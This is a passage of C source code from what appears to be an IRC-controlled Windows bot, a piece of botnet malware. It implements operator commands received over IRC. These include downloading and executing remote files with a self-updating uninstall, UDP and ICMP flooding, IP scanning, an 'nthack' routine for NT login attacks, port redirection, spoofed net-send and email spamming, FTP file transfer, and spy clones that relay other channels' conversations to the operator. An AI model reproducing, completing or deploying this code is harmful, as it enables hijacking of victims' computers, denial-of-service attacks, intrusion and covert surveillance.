					sprintf(sendbuf, "clone created on %s:%d, in channel %s.\r\n", irc.host, irc.port, irc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[irc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
				while(1) {
					if (irc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf);
				if (!silent) sprintf(sendbuf, "redirect created on port %d to %s:%d.\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf, notice);
				threads[rs.threadnum] = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
				while(1) {
					if (rs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
#ifndef NO_SCAN
else if (strcmp("scan", a[s]) == 0 || strcmp("sc", a[s]) == 0) {
	scans sscan;
	sscan.addy.S_un.S_addr = inet_addr(a[s+1]);
	sscan.port = atoi(a[s+2]);
	sscan.delay = atoi(a[s+3]);
	sscan.sock = sock;
	sscan.notice = notice;
	strncpy(sscan.chan,  a[2], sizeof(sscan.chan)-1);
	sprintf(sendbuf, "scan (%s:%d)", inet_ntoa(sscan.addy), sscan.port);
	sscan.threadnum = addthread(sendbuf);
	if (!silent) {
		sprintf(sendbuf, "scan started %s:%d with a delay of %dms\r\n", inet_ntoa(sscan.addy), sscan.port, sscan.delay);
		irc_privmsg(sock, a[2], sendbuf, notice);
	}
	threads[sscan.threadnum] = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
	while(1) {
		if (sscan.gotinfo == TRUE) break;
		Sleep(50);
	}
}
#endif
else if (strcmp("nthack", a[s]) == 0 || strcmp("nth", a[s]) == 0) {
	nth nt;
	strncpy(nt.ip,  a[s+1], sizeof(nt.ip)-1);
	strncpy(nt.u,replacestr(a[s+2],"_"," "), sizeof(nt.u)-1);
//	strncpy(nt.u,  a[s+2], sizeof(nt.u)-1);
	strncpy(nt.p,  a[s+3], sizeof(nt.p)-1);
	nt.sock = sock;
	nt.notice = notice;
	strncpy(nt.chan, a[2], sizeof(nt.chan)-1);
	sprintf(sendbuf, "nt-hack(%s)", nt.ip);
	nt.threadnum = addthread(sendbuf);
	if (!silent) {
		sprintf(sendbuf, "nt hack started (%s) l/p: %s/%s", nt.ip, nt.u, nt.p);
		irc_privmsg(sock, a[2], sendbuf, notice);
	}
	threads[nt.threadnum] = CreateThread(NULL, 0, &nthack, (void *)&nt, 0, &id);
}

			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_UDP
			else if (strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				ps udps;
				udps.silent = silent;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) udps.port = atoi(a[s+5]); else udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;
				sprintf(sendbuf, "udp (%s)", udps.host);
				udps.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "sending %d udp packets to: %s. packet size: %d, delay: %d[ms].\r\n", udps.num, udps.host, udps.size, udps.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				threads[udps.threadnum] = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
				while(1) {
					if (udps.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				if (!noicmp) {
					ps pings;
					pings.silent = silent;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;
					sprintf(sendbuf, "ping (%s)", pings.host);
					pings.threadnum = addthread(sendbuf);
					sprintf(sendbuf, "sending %d pings to %s. packet size: %d, timeout: %d[ms]\r\n", pings.num, pings.host, pings.size, pings.delay);
					threads[pings.threadnum] = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
					while(1) {
						if (pings.gotinfo == TRUE) break;
						Sleep(50);
					}
				} else strncpy(sendbuf, "icmp.dll not available", sizeof(sendbuf)-1);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
			#ifndef NO_SPY
			else if (strcmp("spy", a[s]) == 0 || strcmp("sp", a[s]) == 0) {
				ircs sirc;
				strncpy(sirc.nick,  a[s+1], sizeof(sirc.nick)-1);
				strncpy(sirc.host,  a[s+2], sizeof(sirc.host)-1);
				sirc.port = atoi(a[s+3]);
				strncpy(sirc.channel,  a[s+4], sizeof(sirc.channel)-1);
				if (a[s+5] != NULL) strncpy(sirc.chanpass,  a[s+5], sizeof(sirc.chanpass)-1);
				strncpy(sirc.hchan,  a[2], sizeof(sirc.hchan)-1);
				sirc.sock = sock;
				sirc.spy = 1;
				sprintf(sendbuf, "spy (%s)", sirc.host);
				sirc.threadnum = addthread(sendbuf);
				strncpy(cnick[sirc.threadnum], sirc.nick, sizeof(cnick[sirc.threadnum])-1);
				if (!silent) {
					sprintf(sendbuf, "spy created on %s:%d, in channel %s.\r\n", sirc.host, sirc.port, sirc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[sirc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&sirc, 0, &id);
				while(1) {
					if (sirc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("http", a[s]) == 0) {
				char buf[256];
				char buf3[128];
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				SOCKET theSocket;
				LPHOSTENT lpHostEntry;
				WSAStartup(version, &wsaData);
				lpHostEntry = gethostbyname(a[s+1]);
				theSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = htons(atoi(a[s+2]));
				connect(theSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));	
				sprintf(buf,"%s %s HTTP/1.1\nReferer: %s\nHost: %s\nConnection: close\n\n",a[s+3],a[s+4],a[s+5],a[s+1]);
				send(theSocket, buf, strlen(buf), 0);
				recv(theSocket, buf3, sizeof(buf3), 0);
				closesocket(theSocket);
				WSACleanup();
				sprintf(sendbuf, strtok(buf3,"\n"));
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			//net send addon by Mace mace@attbi.com
			else if (strcmp("ns", a[s]) == 0 || strcmp("netsend", a[s]) == 0) {
				//.netsend <ip> <spoofname> <#repeat> <message>
				DWORD err;
				char buff[32];
				int n = atoi(a[s+3]);
				sprintf(buff, "Sending message %i times to %s using name %s", n, a[s+1], a[s+2]);
				irc_privmsg(sock, a[2], buff, notice);
			//	x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + strlen(a[s+3]) + 7;
			//	char *y = strstr(x, a[s+4]);
				for (int x=0; x< atoi(a[s+3]); x++) {
					err = NetMsgSend(a[s+1], a[s+2], a[s+4]);

					if (err == 1) {
						irc_privmsg(sock, a[2], "Does not work with win9x systems", notice);
						break;
					}
					if (err != 0) {
						sprintf(buff, "There was an error: %i", err);
						irc_privmsg(sock, a[2], buff, notice);
						break;
					}
				}
				if (err == 0) {
					irc_privmsg(sock, a[2], "Success", notice);
				}
			}
			// commands requiring at least 5 parameters
			else if (a[s+5] == NULL) return 1;
			else if (strcmp("email", a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256];
				int port;
				char sender_email[256];
				char recp_email[256];
				char subject[256];
				char BigBuf[1024];
				char myBuf[256];
				int nRet;
				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				WSAStartup(version, &wsaData);
				LPHOSTENT lpHostEntry;
				lpHostEntry = gethostbyname(server);
				SOCKET MailSocket;
				MailSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = htons(port);
				sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
				nRet = connect(MailSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
				nRet = send(MailSocket,  BigBuf, strlen(myBuf), 0);
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
				closesocket(MailSocket);
				WSACleanup();
				sprintf(sendbuf, "email sent to %s",recp_email);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (a[s+6] == NULL) return 1;
			else if (a[s+7] == NULL) return 1;
			else if (strcmp("ftpUp", a[s]) == 0) 
			{ //.ftpUp <site> <port> <login> <pass> <file> <remotefile> <del>
				Ftp ftp;
				strncpy(ftp.url,  a[s+1], sizeof(ftp.url)-1);
				ftp.port = atoi(a[s+2]);
				if (strcmp("del", a[s+7]) == 0) ftp.del = TRUE;
				else ftp.del = FALSE;
				strncpy(ftp.u,  a[s+3], sizeof(ftp.u)-1);
				strncpy(ftp.p,  a[s+4], sizeof(ftp.p)-1);
				strncpy(ftp.f,  a[s+5], sizeof(ftp.f)-1);
				strncpy(ftp.rf,  a[s+6], sizeof(ftp.rf)-1);
				ftp.notice = notice;
				ftp.sock = sock;
				strncpy(ftp.chan,  a[2], sizeof(ftp.chan)-1);
				sprintf(sendbuf, "Upload (%s)", ftp.url);
				ftp.up = TRUE;
				ftp.threadnum = addthread(sendbuf);
				//ftp.silent = silent;
				threads[ftp.threadnum] = CreateThread(NULL, 0, &ftpAccess, (void *)&ftp, 0, &id);
				if (!silent) sprintf(sendbuf, "Uploading %s to %s...\r\n", a[s+5], a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("ftpDown", a[s]) == 0) 
			{ //.ftpDown <site> <port> <login> <pass> <file> <localfile> <del>
				Ftp ftp;
				strncpy(ftp.url,  a[s+1], sizeof(ftp.url)-1);
				ftp.port = atoi(a[s+2]);
				if (strcmp("del", a[s+7]) == 0) ftp.del = TRUE;
				else ftp.del = FALSE;
				strncpy(ftp.u,  a[s+3], sizeof(ftp.u)-1);
				strncpy(ftp.p,  a[s+4], sizeof(ftp.p)-1);
				strncpy(ftp.f,  a[s+5], sizeof(ftp.f)-1);
				strncpy(ftp.rf,  a[s+6], sizeof(ftp.rf)-1);
				ftp.notice = notice;
				ftp.sock = sock;
				strncpy(ftp.chan,  a[2], sizeof(ftp.chan)-1);
				sprintf(sendbuf, "Download (%s)", ftp.url);
				ftp.up = FALSE;
				ftp.threadnum = addthread(sendbuf);
				//ftp.silent = silent;
				threads[ftp.threadnum] = CreateThread(NULL, 0, &ftpAccess, (void *)&ftp, 0, &id);
				if (!silent) sprintf(sendbuf, "Downloading %s to %s...\r\n", ftp.f, ftp.rf);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
		}
	}
	return repeat;
 }


 #ifndef NO_SPY
// function for spies to parse lines
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server)
 {
	char line1[512];
	char line2[512];
	int i;
	char *a[32];
	char a0[128];
	char nick[16];
	char sendbuf[256];

	strncpy(nick,  nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	memset(line2, 0, sizeof(line2));
	strncpy(line1,  line, sizeof(line1)-1);
	strncpy(line2,  line, sizeof(line2)-1);

	// split the current line up into seperate words
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[1] == NULL) return 1;
	if (a[0][0] != '\n') strncpy(a0,  a[0], sizeof(a0)-1);

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);

	else if (strcmp("353", a[1]) == 0) {
		char *m = strstr(line1, a[5]);
		if (m != NULL) {
			sprintf(sendbuf, "[%s]: Users in %s: %s", server, a[4], m+1);
			irc_privmsg(hsock, hchannel, sendbuf, FALSE);
		}
	}

	else if (strcmp("433", a[1]) == 0) {
		sprintf(sendbuf, "[%s]: nick %s already in use.", server, nick1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("JOIN", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		sprintf(sendbuf, "[%s]: %s has joined %s.", a[2]+1, u, a[2]+1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("PART", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		sprintf(sendbuf, "[%s]: %s has left %s.", a[2], u, a[2]);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("KICK", a[1]) == 0) {
		if (strcmp(nick, a[3]) == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "wtf %s?\r\n", strtok(a[0], "!") + 1);
			irc_privmsg(sock, a[2], sendbuf, FALSE);
		}
	}

	else if (strcmp("QUIT", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		char *q = strstr(line2, " :") + 2;
		sprintf(sendbuf, "[%s]: %s has quit(%s).", server, u, q);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = strtok(a[0], "!") + 1;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL) if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		sprintf(sendbuf, "[%s]: %s is now known as %s.", server, oldnck, newnck);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("MODE", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		char *m = strstr(line1, a[3]);
			if (m != NULL) {
				sprintf(sendbuf, "[%s]: %s sets mode: %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
	}

	else if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
		if (strstr(a[2], "#") == NULL) a[2] = strtok(a[0], "!") + 1;
		a[3]++;
		char *u = strtok(a[0], "!") + 1;
		if (strcmp("\1ACTION", a[3]) == 0) {
			char *m = strstr(line1, "ACTION");
			if (m != NULL) {
				m = m + 7;
				sprintf(sendbuf, "[%s]: * %s %s", a[2], u, strtok(m, "\1"));
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
		}
		else {
			char *m = strstr(line1, " :");
			if (m != NULL) {
				m = m + 2;
				sprintf(sendbuf, "[%s]: <%s> %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
		}
	}

	return 1;
 }
 #endif

// irc send functions
 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
 {
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	action = "PRIVMSG"; //remove me
//	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	sprintf(msgbuf, "%s %s :%s\r\n", action, channel, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 #ifndef NO_UDP
// function for sending udp packets
 DWORD WINAPI udp(LPVOID param)
 {
	ps udp;
	SOCKADDR_IN ssin;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	SOCKET usock;
	int i;

	// socket setup
	udp = *((ps *)param);
	ps *udps = (ps *)param;
	udps->gotinfo = TRUE;
	char *host = udp.host;
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	iaddr.s_addr = inet_addr(udp.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :error sending packets to %s.\r\n", udp.chan, host);
		threads[udp.threadnum] = 0;
		threadd[udp.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	else ssin.sin_addr = iaddr;

	srand(GetTickCount());
	if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1); else ssin.sin_port = htons(udp.port);
	if (udp.port < 1) udp.port = 1;
	if (udp.port > 65535) udp.port = 65535;

	udp.num = udp.num / 10;
	if (udp.delay == 0) udp.delay = 1;

	for (i = 0; i < udp.size; i++) pbuff[i] = (rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			sendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1);
	}
	// free(ubuff);
	if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :finished sending packets to %s.\r\n", udp.chan, host);

	threads[udp.threadnum] = 0;
	threadd[udp.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_PING
//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	ps ping;
	HANDLE icmp;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;

	ping = *((ps *)param);
	ps *psp = (ps *)param;
	psp->gotinfo = TRUE;
	char *host = ping.host;

	icmp = (HANDLE)fIcmpCreateFile();

	iaddr.s_addr = inet_addr(ping.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(ping.host);
	if ((hostent == NULL && iaddr.s_addr == INADDR_NONE) || icmp == INVALID_HANDLE_VALUE) {
		if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :error sending pings to %s.\r\n", ping.chan, host);
		threads[ping.threadnum] = 0;
		threadd[ping.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ip = *(DWORD*)*hostent->h_addr_list;
	else ip = iaddr.s_addr;

	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > 65500) ping.size = 65500;
	if (ping.delay < 1) ping.delay = 1;
	for (i = 0; i < ping.num; i++) {
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	}

	fIcmpCloseHandle(icmp);
	if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :finished sending pings to %s.\r\n", ping.chan, host);

	threads[ping.threadnum] = 0;
	threadd[ping.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_DOWNLOAD
// function for downloading files/updating
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :couldn't open %s.\r\n", dl.chan, dl.dest);
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 1;
		start = GetTickCount();

		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
			total = total + r;
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "file download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :opened %s.\r\n", dl.chan, dl.dest);
			}

		// download is an update
		} else {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec. updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "update failed: error executing file.", FALSE);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "bad url, or dns error.", FALSE);

	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_REDIRECT
// port redirect function
 DWORD WINAPI redirect(LPVOID param)
 {
	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	rs redirect;
	DWORD id;

	redirect = *((rs *)param);
	rs *rsp = (rs *)param;
	rsp->gotinfo = TRUE;
	rsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = htons(redirect.lport);
	bind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	csock[redirect.threadnum] = rsock;

	while(1) {
		if (listen(rsock, 10) == SOCKET_ERROR) break;
		clsock = accept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redirect.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redirect, 0, &id);
		}
	}

	closesocket(clsock);
	closesocket(rsock);

	threads[redirect.threadnum] = 0;
	threadd[redirect.threadnum][0] = '\0';

	return 0;
 }

// part of the redirect function, handles sending/recieving for the remote connection.
 DWORD WINAPI redirectloop(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];
	rs rs2;
	rs2 = *((rs *)param);
	csock = rs2.csock;
	dest = rs2.dest;
	port = rs2.port;
	DWORD id;

	while (1) {
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dest);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = recv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = send(sock, buff, err, 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}

	closesocket(csock);
	closesocket(sock);

	return 0;
 }

// part of the redirect function, handles sending/recieving for the local connection.
 DWORD WINAPI redirectloop2(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	rs rs2;
	int err;
	char buff[4096];
	rs2 = *((rs *)param);
	sock = rs2.sock;
	csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) {
			break;
		}
		if (err == SOCKET_ERROR) break;
		err = send(csock, buff, err, 0);
		if (err == SOCKET_ERROR) break;
	}

	closesocket(csock);
	return 0;
 }
 #endif

 #ifndef NO_NETINFO
// function used for netinfo
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
